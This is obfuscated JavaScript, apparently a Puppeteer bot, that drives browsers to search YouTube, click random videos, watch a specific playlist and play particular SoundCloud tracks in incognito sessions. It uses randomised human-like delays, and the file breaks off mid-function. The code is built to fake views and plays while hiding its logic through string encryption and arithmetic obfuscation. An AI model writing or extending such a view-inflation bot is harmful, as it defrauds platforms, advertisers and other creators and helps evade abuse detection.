const a0 = d,
  Z = b,
  Y = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x6f * -0x13 + -0x1f * 0x2e + -0xd0 * -0x11))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1167 + 0x21c9 + -0x3330), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xbc * 0x2 + 0x1885 + 0x5b33 + (0x17b3 + 0x4 * -0x147f + 0x74e1) * random()) : await standardWaitForNetIdle(f), await wait(-0x2 * 0x506 + -0x32 * -0x11 + 0x1a42 + (0x8e * -0x35 + 0x5ed * -0x7 + 0x15fd * 0x5) * random()), 0x2497 + -0x172b + -0xd6b;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xabc + 0x12cd + 0xc5 * -0xd), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x486 + 0x1c9f + -0x1092 * 0x2;
}
async function randomWait() {
  return await wait(0x19 * -0x139 + 0x26 * 0x9 + 0x30c3 + (-0x4 * 0x19 + -0x1 * 0x4cf + 0xd * 0x1e7) * random()), 0xd80 + 0x4 * -0x33d + -0x8b * 0x1;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * -0x1fab + 0x1 * 0x2347 + 0x2a * -0x16, 0x26 * 0x18 + 0x1fb * 0xb + 0x1cf * -0xe), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x885a + -0x7bbf * -0x1 + -0xabd * -0x17) * getRandomInt(-0x202f + -0x17bf + 0x37f0, 0x4c2 + -0x1 * -0x85f + 0x68e * -0x2), h)), -0x79 * -0x11 + 0x7cf * 0x2 + -0x3 * 0x7e2;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = d,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x10 * -0xdb + -0x11c * -0x1a + 0x1e5 * -0x8;
    i = i['split'](i['includes']('of') ? R(0x15) : ',\x20')[-0x179c + -0x1 * -0x6c5 + 0x10d8]['split']('\x20');
    for (let k = 0x47 * -0x4c + 0x239d + 0x1 * -0xe89; k < i['length']; k += 0xd6e + 0x1a60 + 0x46c * -0x9)
      j += i[k] * h[i[k + (0x405 + 0x20c * 0xc + -0x1c94)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1a17 * -0x1 + -0x1ba7 * -0x1 + -0x35b8)['map'](l => Array['from'](l['children']))['flat'](-0x12ba + 0x2 * 0x9d5 + -0xef * 0x1)['map'](l => l['childNodes'][-0x1be1 + -0x1 * -0x1607 + 0x5db]['childNodes'][0x2 * 0x92b + -0xf2 + 0x4 * -0x459]['childNodes'][-0x1 * -0x373 + -0x1162 + -0x8 * -0x1be]['childNodes'][-0x1d * -0x10e + 0xbce * 0x3 + -0x4 * 0x1080]['childNodes'][0x1039 * 0x1 + 0x1638 + 0x2670 * -0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x20 * 0x120 + -0x440 + 0x1 * -0x1bd8, -0x25c4 + 0x1501 * -0x1 + -0x5 * -0xfa9)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x2036 + -0x234a + 0x3dac);
  const h = await getMaxTime(f),
    i = Math['min']((0x2 * -0x9c3a + 0x6605 + 0x1bccf) * getRandomInt(-0x1152 + -0x198e * 0x1 + 0x3e6 * 0xb, 0x1 * -0xc22 + 0xa01 * 0x2 + -0x1 * 0x7db), h);
  return await wait(i), -0x1679 + 0x2 * 0x12a8 + -0xed6;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x250b + -0x15b4 + 0x11 * -0xe7]['children'][-0x1551 + -0x1a14 * -0x1 + -0x4c3]['children'][0x1b91 * -0x1 + 0x1d71 + -0x1e0]['children'][0x137b * 0x1 + -0x265 * 0x4 + -0x1 * 0x9e7]['children'][-0x259d * -0x1 + 0x14 * -0x114 + -0x100d]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x688 + 0x1b7 * 0x1 + 0x4d2;
}

function a() {
  const bn = [
    '98a379eac0',
    'mMTty2DLtK9Wta',
    'BSkXeCo2W7abWQFdIrjO',
    'DgeGA2LSBcXTBW',
    'ew8tW68oASkwWQayhG',
    'j_nI6G3ZDi',
    'Aw5KzxHpzG',
    'y2fTCgfPz249CW',
    's8kZW4TeqH/dTSkQmb4',
    'Slither.io',
    '-have-we-f',
    'mcaOtgLUDxG7ia',
    'Android\x2010',
    'xCoNcY8iWO5cFSoJyG',
    'W7LDCCoeWOHfymoEW6dcNq',
    'wfLQC1r4AtzVrq',
    'zs5TzwrPDw0UyW',
    'u8k8bmknW5vjrIFcM04',
    'WPLogCoZWO/cHCk8adZdUW',
    'AgfZAgvK',
    'CK5Rwf9bngTcqq',
    '\x20of\x20',
    'WONdISk1WODvW5G/W5vyFq',
    'v093utbvEgjsAG',
    'WO7cNG3dL8oev8kJj8k+W6O',
    'WOingSktWOS7WOy2nbm',
    'uYJdQWf7xWKKpua',
    'rg/en/scri',
    'AwXHDgLVBIXTAq',
    'W5PKvbTjgeWVW5G+',
    'BgvUz3rO',
    'zsXTAw5Ly3jHzG'
  ];
  a = function() {
    return bn;
  };
  return a();
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x26 * 0x67 + -0x1d2 + -0x8c * -0x20 + (0x1 * -0x24b + -0x7a0 + 0xa1d) * random()
  }), await wait(-0x4 * -0x952 + -0x7ad + 0x1ba7 * -0x1 + (0x16dd * 0x1 + -0xfe * -0x9 + -0x1e9f) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x122 * -0x14 + -0xb11 * -0x1 + 0xb99]['childNodes'][-0x161e + -0x280 * -0x2 + 0x111f]['childNodes'][0x1f40 + 0x17cb + -0x370a]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xf03 + 0x21ec + -0x1875 * 0x2]['childNodes'][-0x2543 + -0x1d5c + 0x429f]['childNodes'][0x5ea + -0x1b * 0x22 + 0x2 * -0x129]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x15d7 + -0x17ba + 0x2d92 * 0x1),
          r = 0x2272 + -0x1ed5 + -0x39d;
        for (let u = -0x4a * 0x6f + -0xd53 * 0x2 + 0x2a * 0x166; u < q['length']; u += -0xf24 + -0x15e6 + 0x250c)
          r += q[u] * k[q[u + (-0x255 * -0x1 + -0x471 + 0x21d * 0x1)]];
        return r;
      }(n);
  });
  await wait((0x5f40 + -0x2af8 + -0x8 * -0xca) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x175c0 + -0x13994 + -0x571a * -0x2) * getRandomInt(-0x1f4d + 0x1c0a + 0xd1 * 0x4, 0x1c07 + 0x8 * -0xc2 + -0x15ed), h + (-0x6be + 0x1 * -0x1c0a + 0x3650));
  return await wait(i), -0x1702 + -0x22d8 + 0x39db;
}
async function keyWatch(f) {
  const S = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1 * 0x2d2 + -0x1372 + 0x96 * 0x26), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + S(0x18, 'dWw)') + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1d51 + -0xad1 * -0x2 + 0x1367 + (0x4 * -0x194 + -0x13cd * 0x1 + 0x1 * 0x1e05) * Math['random']());
    });
  }, -0x1 * 0x774 + -0xef * 0x11 + 0x32ab);
  await wait(-0x13a * -0x9e + 0x61 * -0x9fe + -0x79b52 * -0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xa5bc + -0x13 * -0xd59 + -0xb8f7) * getRandomInt(0x1 * -0x92f + 0x61 + 0x8d2, -0x9cd * -0x1 + 0x1e8d + -0x3 * 0xd6b)), clearInterval(h), 0x25d6 + -0x6c5 * -0x5 + -0x47ae;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x10b * 0x20 + 0x639 * -0x6 + 0x46b6;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1423 + -0x9 * -0x61 + 0x10bb;
    await randomWait();
  }
  return 0x5 * -0x21d + 0x8 * -0x28f + 0x1f0a;
}

function fetchRandomSC() {
  const U = d,
    T = c;
  return Math['random']() <= 0x2694 + -0x2275 * -0x1 + 0x1 * -0x4909 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x697 * -0x5 + -0x107c + -0x1 * -0x316f + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + T(0x7) + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + U(0x0) + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xa * -0x29c + -0x2 * 0x7fa + 0x2 * 0x1506);
    let h = e[f];
    if (b['xaYGWB'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x483 + 0x2625 + -0x2aa8, s, t, u = 0x23b * -0x2 + 0xb78 + -0x702; t = n['charAt'](u++); ~t && (s = r % (0x1f * -0x2e + 0x1564 + -0xee * 0x11) ? s * (0x1167 + 0x21c9 + -0x32f0) + t : t, r++ % (0x3f * 0x1 + 0x416 + -0x451)) ? p += String['fromCharCode'](0x7e6 + 0x3 * -0x91c + 0x146d & s >> (-(-0x2 * 0x506 + -0x32 * -0x11 + 0x6bc) * r & 0x47 * -0x35 + 0x426 * -0x5 + 0x2377 * 0x1)) : 0x2497 + -0x172b + -0xd6c) {
          t = o['indexOf'](t);
        }
        for (let v = 0xabc + 0x12cd + 0x1d89 * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x486 + 0x1c9f + -0x2115 * 0x1))['slice'](-(0x19 * -0x139 + 0x26 * 0x9 + 0x1d3d));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x4 * 0x19 + -0x1 * 0x4cf + 0xb * 0x79,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xd80 + 0x4 * -0x33d + -0x14 * 0x7; u < 0x1 * -0x1fab + 0x1 * 0x2347 + 0xa7 * -0x4; u++) {
          p[u] = u;
        }
        for (u = 0x26 * 0x18 + 0x1fb * 0xb + 0x67 * -0x3f; u < -0xb5d + -0x528 * -0x2 + -0x19 * -0x15; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x202f + -0x17bf + 0x38ee), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x4c2 + -0x1 * -0x85f + 0xd21 * -0x1, q = -0x79 * -0x11 + 0x7cf * 0x2 + -0x7 * 0x361;
        for (let v = 0x10 * -0xdb + -0x11c * -0x1a + 0x1e5 * -0x8; v < n['length']; v++) {
          u = (u + (-0x179c + -0x1 * -0x6c5 + 0x10d8)) % (0x47 * -0x4c + 0x239d + 0x15 * -0xa5), q = (q + p[u]) % (0xd6e + 0x1a60 + 0x1367 * -0x2), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x405 + 0x20c * 0xc + -0x1b95)]);
        }
        return t;
      };
      b['esySAp'] = m, c = arguments, b['xaYGWB'] = !![];
    }
    const j = e[-0x1a17 * -0x1 + -0x1ba7 * -0x1 + -0x35be],
      k = f + j,
      l = c[k];
    return !l ? (b['bjAcNy'] === undefined && (b['bjAcNy'] = !![]), h = b['esySAp'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function runGFModule(f, h) {
  async function i() {
    const V = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1690 + 0x797 * -0x5 + 0x3c83 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x47e * 0x7 + -0xbe + 0x2030;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x84 + -0x12a8f + 0x1dadb + getRandomInt(0x4770 + 0x588d + 0x1 * -0x6565, 0x5c * -0x40 + 0xec7 + 0x7d69));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x9 * -0x22 + -0x216f + 0x22a2), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1087 * -0x1 + 0x7 * 0x1cd + -0xe91 * 0x2;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x89a + -0x2608 + -0x1d6e * -0x1, -0xff9 + -0x1a7d * 0x1 + 0x2aa8)), v['includes'](V(0x8, 'n]x(') + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x20bf + 0x1a57 + -0x3346 + floor((0xb32 * 0x1 + 0x1 * -0x2209 + 0x1abf) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x22 * -0x429a4dd + 0x6a07f8c0 + 0x37b * -0x225a2e),
          -0x24ba1e + -0x35f369 * 0x1 + 0x1 * 0xdaad87,
          0x6d6e + 0xa389 + -0x90f7,
          -0x10 * -0x72 + 0x5 * 0x38e + -0x1866
        ], y = [
          0x1f9 + -0x1ad * 0x8 + 0xb87,
          -0x26e * -0x4 + -0xe7 * 0x1 + -0x8c1,
          0x1412 + -0x1 * -0x1c8b + -0x1 * 0x3095,
          0xb5 * -0x2b + -0xd39 * -0x1 + 0x112e
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x17ab * 0x1 + 0x2211 + -0x39bb)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x2451 + 0x448 + -0x2899; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x78b * 0x1 + 0x1 * -0xba1 + -0x416 * -0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1153 * -0x1 + 0x1 * -0x1b13 + 0x2c66] = A[-0x1e2e * 0x1 + 0x2011 + -0x1d3 * 0x1] = A[-0x2311 + -0x15cf * -0x1 + -0xd43 * -0x1] = A[0xdb * -0x6 + -0x10a6 + 0x15ca] = A[-0x6d3 + -0x7 * 0x474 + 0x116 * 0x23] = A[0x414 + -0xaf9 + 0x6e9] = A[0x15 * -0x165 + 0x158 * -0x1a + -0x6 * -0xab5] = A[0x209 * -0xf + 0x175 + -0x8 * -0x3a3] = A[-0x215f + -0x65 * -0x3a + 0xa84] = A[0x9c5 * -0x3 + -0x1b9b + 0x38f2] = A[-0x5 * 0x1cf + -0x966 * 0x1 + -0x1ae * -0xb] = A[0x4fe + -0x10ae + 0xbba] = A[-0xce4 + -0xe * -0x272 + -0x7 * 0x30b] = A[0x1 * 0xf9d + 0x150b * -0x1 + 0x57a] = A[-0x9ff * 0x1 + -0x855 * 0x1 + 0x1261] = A[-0x1 * 0x17e5 + -0x1577 + 0x2d6a] = A[0x1ff3 * 0x1 + -0x1ceb + -0x2f9] = 0x1abf + 0x204d + -0x3b0c, this['blocks'] = A) : this['blocks'] = [
                -0x57f * 0x5 + -0x7 * -0x1c9 + 0xefc,
                0x1c * 0x1f + 0xe13 + -0x1177,
                0x2 * -0x126a + -0x1245 + 0x3719,
                0x4a * -0x85 + 0xa2e + 0x2 * 0xe22,
                0xa45 + 0x11 * -0x214 + 0x190f * 0x1,
                0x11a3 + -0x1af6 + -0xb * -0xd9,
                -0x1 * -0x1943 + 0x136 + 0x1 * -0x1a79,
                -0x5ee + -0x469 * -0x5 + -0x101f * 0x1,
                -0x27 + 0x269 * 0x2 + -0x4ab,
                -0x417 * -0x3 + -0x22f2 + 0x1b * 0xd7,
                0xff3 + 0x876 + 0x823 * -0x3,
                0x107 * 0x9 + 0x15ec + -0x1f2b,
                -0x449 * -0x3 + 0x7b * 0xb + -0x24 * 0x81,
                0xe9 * -0x8 + -0x21fb * 0x1 + 0x2943,
                0x124f + -0x13 * -0x21 + -0x14c2,
                0xb29 * 0x1 + 0x2500 + -0x3029 * 0x1,
                -0xfbf + 0x1 * -0x1ea7 + 0x2e66
              ], this['h0'] = 0x2fb9a88a + 0x5320b * -0x2011 + -0x3876 * -0x3ef3b, this['h1'] = -0x7d014e5a + -0x7 * 0xf30f809 + -0x1d725c222 * -0x1, this['h2'] = 0x12f62163d + 0x4f * 0x6e907f + 0x2 * -0x5c62e838, this['h3'] = -0x18ae74f6 + -0x1a4364d5 + 0x43242e41, this['h4'] = -0xbf7fb6d1 + 0x29af3320 + 0x159a365a1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1 * -0xc4f + -0x1 * -0x1a0e + -0xcf * 0x11, this['finalized'] = this['hashed'] = 0x270e + 0xb7 * 0x21 + -0x1 * 0x3ea5, this['first'] = 0x1a25 + 0x899 + -0x22bd;
            }
            ['update'](J) {
              const W = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x26e6 + -0xae5 + -0x15 * -0x25f, O = J['length'] || -0x994 * 0x2 + 0x54 * 0x3 + 0x122c * 0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1 * 0x2137 + -0x1 * -0x3a5 + -0x24dc, P[-0x53b + 0x316 + 0xb7 * 0x3] = this['block'], P[0x17f + 0x426 + -0x595] = P[-0x1365 + -0x578 + 0x6 * 0x425] = P[0x2135 + -0x1 * 0x8d2 + -0x1861] = P[-0x4f6 + -0x1ab + 0x6a4] = P[0x637 * 0x5 + 0x24eb + -0x43fa] = P[-0x397 + -0x541 * -0x1 + 0x1a5 * -0x1] = P[0x3b * 0x6d + 0x1 * 0x214f + 0x10b * -0x38] = P[-0x338 * -0x7 + -0x22a * -0x2 + -0x1ad5] = P[0x2213 + 0x1 * 0x22c6 + -0x44d1] = P[0x1357 * -0x1 + -0x2 * 0xe39 + 0x2fd2] = P[0x1e3e + 0x1499 * -0x1 + -0x99b] = P[-0x1024 + -0x144d + -0x4 * -0x91f] = P[-0x1cc8 + 0x13bb + 0x919 * 0x1] = P[-0x1770 + -0xfdc + 0x2759] = P[0x26b4 + 0x17af + -0x3e55] = P[-0x114f + 0x8bb * -0x4 + -0x2e * -0x123] = 0x1d15 * -0x1 + 0xcbd + 0x2 * 0x82c), K) {
                    for (N = this['start']; M < O && N < 0x932 + 0x1692 + -0x7e1 * 0x4; ++M)
                      P[N >> -0x12e * 0x2 + -0x3ad * -0x9 + -0x1eb7] |= J[M] << y[-0x6d * -0x3d + 0x4fe + -0x1ef4 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1261 + 0x1670 + -0x2891; ++M)
                      (L = J['charCodeAt'](M)) < 0x4bb * 0x8 + -0x1fd5 * 0x1 + 0x583 * -0x1 ? P[N >> -0x24de + 0x16a * -0x4 + 0x2a88] |= L << y[-0x1e3 + 0xf3f * -0x1 + 0x39 * 0x4d & N++] : L < -0x2 * 0x130b + -0x20e * -0xf + 0x7a2 * 0x2 ? (P[N >> 0x104f + -0x13a * -0x8 + -0x1a1d] |= (0x779 * -0x1 + 0x2422 + -0x1be9 | L >> -0x26cd + 0x323 * -0x4 + 0x335f) << y[-0x25d2 + -0x25e9 + -0xa * -0x793 & N++], P[N >> 0x950 + -0x1021 + 0x1 * 0x6d3] |= (-0x966 + 0x1938 + 0x7a9 * -0x2 | -0x1 * -0x148d + -0x5a * 0x2 + -0x139a & L) << y[0xc6 * -0x1a + 0xb26 + 0x8f9 * 0x1 & N++]) : L < 0x15ea9 + -0x1103 * 0xb + -0x124 * -0x2e || L >= -0xd30d + 0x3a * 0x5de + 0x5ec1 ? (P[N >> 0x970 + 0xd6b + -0x1 * 0x16d9] |= (-0xc2 * -0x1 + -0x1638 + 0x1656 | L >> -0x710 + -0x1 * 0x20b8 + 0x27d4) << y[-0x1c5 + 0x12a * 0xb + 0xa6 * -0x11 & N++], P[N >> -0x58f * -0x7 + -0x71d * -0x3 + -0x3c3e] |= (0x63e + -0x88e + 0x5 * 0x90 | L >> -0x1398 + 0x258e + -0x11f0 & -0x270a + 0x101e + 0x172b) << y[-0x1 * -0x176d + 0xa57 * -0x1 + -0xd13 & N++], P[N >> -0xf * -0x145 + 0x1e5a + -0x3163 * 0x1] |= (0x58 * 0x58 + -0x2 * -0x92f + -0x301e | 0x3 * 0x45c + -0xa * 0x5c + -0x93d & L) << y[-0x909 + 0x26 * 0x89 + -0xb4a & N++]) : (L = 0xd * 0x74a + 0x1e2 * -0xa + -0x49e * -0x27 + ((0xa6 * -0x33 + 0x2 * 0x30b + 0x1efb & L) << -0x1 * -0x11fc + 0x4 * 0x859 + -0x3356 | -0x170 + 0xdfe + -0x139 * 0x7 & J['charCodeAt'](++M)), P[N >> 0x2 * -0x16d + -0xae9 + 0x1 * 0xdc5] |= (-0x2 * -0xa7f + 0x275 * -0x5 + -0x7c5 | L >> 0x1f07 + 0x967 * 0x3 + 0x1 * -0x3b2a) << y[-0x121a + -0x13c2 + 0x25df & N++], P[N >> 0xe75 * 0x2 + 0xc24 + -0x11c * 0x25] |= (0x77f + -0x1 * 0x62f + -0xd0 | L >> 0x9 * 0x42d + 0x7 * 0x3d9 + 0x4 * -0x101e & 0x1e8 * -0x9 + -0xfd2 + -0x6a5 * -0x5) << y[-0x1b75 + -0xd3 + -0x1c4b * -0x1 & N++], P[N >> -0x414 + -0x16 * -0xda + -0xea6] |= (0x1 * 0x1889 + 0x251c + -0x3d25 | L >> 0x226 + 0x1 * -0x221b + 0x1ffb & 0x169e + -0x2004 + 0x9a5) << y[0x130d * -0x1 + -0x8ea + -0x1 * -0x1bfa & N++], P[N >> -0x1 * -0x144d + 0xcf5 * -0x3 + 0x1294] |= (0x9f3 + -0x1bd6 * -0x1 + -0x2549 | -0x5 * 0x4b1 + -0x1d3 * 0x3 + -0x1d2d * -0x1 & L) << y[-0xab0 + 0x384 + 0x3 * 0x265 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1d09 + -0x3 * 0x3c1 + -0x2 * 0x8c3 ? (this['block'] = P[-0x7a + -0xd77 * -0x1 + 0xced * -0x1], this['start'] = N - (0xa7e + 0x6d8 + -0x1116), this['hash'](), this[W(0x13)] = 0x1 * -0x6fb + 0x77 * -0x3e + -0x1 * -0x23ce) : this['start'] = N;
                }
